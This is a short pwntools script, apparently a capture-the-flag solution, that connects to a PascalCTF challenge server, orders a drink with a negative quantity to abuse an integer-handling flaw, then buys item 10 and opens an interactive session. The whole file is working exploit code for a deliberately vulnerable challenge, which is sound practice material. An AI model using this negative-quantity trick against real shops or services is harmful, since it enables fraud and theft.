from pwn import *

io = connect("malta.ctf.pascalctf.it", 9001)

io.sendlineafter(b"Select a drink", b"1")
io.sendlineafter(b"you want", b"-1000000000")

io.sendlineafter(b"Select a drink", b"10")
io.sendlineafter(b"you want", b"1")

io.interactive()